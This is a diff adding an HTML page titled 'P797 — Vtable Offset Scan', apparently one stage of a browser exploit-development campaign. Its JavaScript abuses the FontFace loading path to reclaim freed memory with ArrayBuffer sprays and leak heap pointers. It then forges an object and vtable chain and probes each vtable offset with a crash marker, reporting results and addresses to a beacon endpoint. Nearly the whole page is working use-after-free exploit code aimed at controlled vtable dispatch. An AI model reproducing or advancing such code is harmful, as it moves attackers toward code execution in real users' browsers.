@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P797 — Vtable Offset Scan</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P797 — Vtable Offset Scan
+ *
+ * P796 Phase A PROVED: 3-level chain with zeroed vtable entries
+ * SURVIVES. NULL entries get NULL-checked and skipped.
+ * Phase C showed non-NULL entries get followed → crash.
+ *
+ * Chain model confirmed:
+ *   q1 → [q1+0] = q13 → [q13+0] = vtable_ptr → [vtable+N] = entry
+ *   if (entry != NULL) { call/follow entry }  ← NULL-checked!
+ *
+ * The vtable base is at q4 (AB offset 0x20). The engine reads
+ * [vtable+N] for some specific N. This probe finds N by setting
+ * ONE vtable entry at a time to 0x4242424242424242 (crash marker).
+ *
+ * If the phase CRASHES → engine reads that offset
+ * If the phase SURVIVES → engine does NOT read that offset
+ *
+ * Phases test vtable[0] through vtable[6] (q4 through q10):
+ *   A: vtable[0] = q4 = 0x4242  (offset 0)
+ *   B: vtable[1] = q5 = 0x4242  (offset 8)
+ *   C: vtable[2] = q6 = 0x4242  (offset 16)
+ *   D: vtable[3] = q7 = 0x4242  (offset 24)
+ *   E: vtable[4] = q8 = 0x4242  (offset 32)
+ *   F: vtable[5] = q9 = 0x4242  (offset 40)
+ *   G: vtable[6] = q10 = 0x4242 (offset 48)
+ *
+ * From P796-A: q11 (vtable[7]) is non-NULL and survived, so
+ * vtable[7] is NOT accessed. q13 (vtable[9]) same. Only need
+ * to test vtable[0-6].
+ *
+ * CRASH_CLASS: HIGH — controlled vtable dispatch
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P797-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P797-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+var PHASES = ['A','B','C','D','E','F','G'];
+var VTABLE_QWORDS = [4, 5, 6, 7, 8, 9, 10]; /* which view1[] index to test */
+var VTABLE_OFFSETS = [0, 8, 16, 24, 32, 40, 48]; /* byte offset from vtable base */
+
+function getPhase(){
+  try { return localStorage.getItem('p797_phase') || 'A'; }
+  catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p797_phase', p); } catch(e){}
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  b('BOOT', 'phase=' + phase);
+  log('P797 — Vtable Offset Scan — Phase ' + phase + '\n');
+
+  var idx = PHASES.indexOf(phase);
+  if (idx < 0 || idx >= PHASES.length){
+    log('All phases complete! Check beacons.');
+    b('ALLCOMPLETE', '');
+    try { localStorage.removeItem('p797_phase'); } catch(e){}
+    return;
+  }
+
+  var testQword = VTABLE_QWORDS[idx];
+  var testOffset = VTABLE_OFFSETS[idx];
+  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
+  setPhase(nextPhase);
+
+  log('Testing vtable[' + idx + '] at offset ' + testOffset + ' (q' + testQword + ')');
+  log('Setting q' + testQword + ' = 0x4242424242424242, all others = 0\n');
+
+  doTest(phase, testQword, function(view1, q11_1, q13_1){
+    var self_addr = q11_1 - 0x68n;
+
+    /* Build fake chain: q13 → fake obj at q2, q2 → fake vtable at q4 */
+    view1[13] = self_addr + 0x10n; /* q13 → q2 */
+    view1[2] = self_addr + 0x20n;  /* q2 → q4 (vtable base) */
+    view1[3] = 0n;
+
+    /* Zero all vtable entries */
+    for (var i = 4; i <= 10; i++) view1[i] = 0n;
+
+    /* Set the ONE test entry to crash marker */
+    view1[testQword] = 0x4242424242424242n;
+
+    /* Zero q14-q16 to prevent secondary crashes */
+    view1[14] = 0n; view1[15] = 0n; view1[16] = 0n;
+
+    b(phase + '-SET', 'q' + testQword + '=0x4242|vtable_off=' + testOffset +
+      '|self=0x' + h16(self_addr));
+  });
+}
+
+function doTest(label, testQword, setupFn){
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:vt1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('v1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em vt1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em v1, vt1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(label + '-P1-MISS', 'no_reclaim');
+      log('Pass 1 MISS. Retrying...');
+      setPhase(label); /* retry same phase */
+      setTimeout(function(){ location.reload(); }, 500);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+
+    b(label + '-P1-HIT', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
+    log('P1 HIT: q11=0x' + h16(q11_1));
+
+    /* Apply setup */
+    setupFn(view1, q11_1, q13_1);
+
+    /* Warmup */
+    for (var i = 0; i < 128; i++) new ArrayBuffer(192);
+
+    /* Pass 2: q1 = q11 → engine follows chain */
+    var st2 = document.createElement('style');
+    st2.textContent = '@font-face{font-family:vt2;src:local(Arial);unicode-range:U+0044;}';
+    document.head.appendChild(st2);
+
+    var face2 = new FontFace('v2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var abs2 = [], fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+
+        for (var k = 0; k < 64; k++){
+          var ab = new ArrayBuffer(192);
+          var v = new BigUint64Array(ab);
+          v[1] = q11_1;
+          abs2.push(ab);
+        }
+
+        try { document.fonts.check('1em vt2'); } catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    document.fonts.load('1em v2, vt2', 'CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var best2 = -1;
+      for (var i = 0; i < abs2.length; i++){
+        var v = new BigUint64Array(abs2[i]);
+        if (v[0] === 1n){ best2 = i; break; }
+      }
+
+      if (best2 < 0){
+        b(label + '-P2-MISS', 'no_reclaim');
+        log('Pass 2 MISS');
+      } else {
+        var view2 = new BigUint64Array(abs2[best2]);
+        b(label + '-P2-HIT', 'i=' + best2 +
+          '|q0=0x' + h16(view2[0]) +
+          '|q11=0x' + h16(view2[11]) +
+          '|q13=0x' + h16(view2[13]));
+        log('P2 HIT (#' + best2 + ')');
+      }
+
+      b(label + '-SURVIVED', 'vtable[' + PHASES.indexOf(label) + ']_not_accessed');
+      log('*** Phase ' + label + ' SURVIVED — vtable[' + PHASES.indexOf(label) + '] at offset ' +
+        VTABLE_OFFSETS[PHASES.indexOf(label)] + ' is NOT accessed ***\n');
+
+      setTimeout(function(){ location.reload(); }, 500);
+    }, 500);
+  }, 400);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P797 — Vtable Offset Scan — Loading...</pre>
+</body>
+</html>
